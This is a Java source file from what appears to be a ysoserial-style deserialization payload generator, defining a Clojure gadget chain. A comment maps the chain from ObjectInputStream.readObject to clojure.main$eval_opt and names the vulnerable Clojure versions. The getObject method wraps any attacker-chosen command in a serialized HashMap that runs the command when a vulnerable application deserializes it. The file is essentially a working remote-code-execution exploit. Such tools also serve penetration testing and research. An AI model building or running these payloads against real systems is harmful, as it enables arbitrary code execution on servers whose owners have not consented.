package org.su18.ysuserial.payloads;


import clojure.core$comp;
import clojure.core$constantly;
import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;
import clojure.main$eval_opt;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.clojure.ClojureUtil;

import java.util.HashMap;
import java.util.Map;

import static org.su18.ysuserial.payloads.annotation.Authors.JACKOFMOSTTRADES;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			HashMap.readObject()
				AbstractTableModel$ff19274a.hashCode()
					clojure.core$comp$fn__4727.invoke()
						clojure.core$constantly$fn__4614.invoke()
						clojure.main$eval_opt.invoke()

	Requires:
		org.clojure:clojure
		Versions since 1.2.0 are vulnerable, although some class names may need to be changed for other versions
 */
@Dependencies({"org.clojure:clojure:1.8.0"})
@Authors({JACKOFMOSTTRADES})
public class Clojure implements ObjectPayload<Map<?, ?>> {

	public Map<?, ?> getObject(String command) throws Exception {
		String              clojurePayload = ClojureUtil.makeClojurePayload(command);
		Map<String, Object> fnMap          = new HashMap<String, Object>();
		fnMap.put("hashCode", (new core$constantly()).invoke(Integer.valueOf(0)));
		AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
		model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
		HashMap<Object, Object> targetMap = new HashMap<Object, Object>();
		targetMap.put(model, null);
		fnMap.put("hashCode", (new core$comp())
				.invoke(new main$eval_opt(), (new core$constantly())

						.invoke(clojurePayload)));
		model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
		return targetMap;
	}
}
